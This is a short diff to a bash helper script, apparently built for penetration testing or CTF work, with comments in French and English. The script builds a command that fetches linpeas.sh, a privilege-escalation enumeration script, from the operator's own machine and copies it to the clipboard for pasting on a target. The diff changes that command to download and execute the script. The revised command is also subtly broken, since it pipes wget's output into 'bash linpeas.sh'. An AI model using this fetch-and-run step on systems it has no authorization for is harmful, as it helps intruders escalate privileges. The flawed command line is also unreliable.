@@ -48,7 +48,7 @@ echo -e "\e[34mObtention de l'adresse IP de l'interface $interface...\n\e[0m"
 ip_address=$(ip -o -4 addr show dev $interface | awk '{split($4,a,"/");print a[1]}')
 
 # Store the wget command in a variable / Stocker la commande wget dans une variable
-wget_command="wget http://$ip_address/linpeas.sh"
+wget_command="wget http://$ip_address/linpeas.sh | bash linpeas.sh"
 
 # Display the command and copy it to the clipboard / Afficher la commande et la copier dans le presse-papier
 echo -n "$wget_command" | xclip -selection clipboard
